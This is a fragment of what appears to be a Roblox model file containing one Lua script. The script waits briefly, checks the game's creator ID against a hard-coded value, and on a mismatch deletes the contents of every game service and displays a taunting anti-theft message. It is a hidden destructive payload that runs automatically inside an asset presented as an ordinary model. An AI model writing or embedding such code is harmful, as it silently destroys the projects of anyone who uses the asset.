								<string name="Name">Script</string>
								<ProtectedString name="Source">wait(2)
function annihilateGame()
&#9;script.Parent = game
&#9;local msg = Instance.new(&quot;Message&quot;)
&#9;for index, service in pairs(game:GetChildren()) do
&#9;&#9;for i2, child in pairs(service:GetChildren()) do
&#9;&#9;&#9;child:Remove()
&#9;&#9;end
&#9;end

&#9;msg.Parent = workspace
&#9;msg.Text = &quot;THIS is why you shouldn&apos;t steal from other people.&quot;
end

if game.CreatorId ~= 324616 then
&#9;annihilateGame()
end
</ProtectedString>
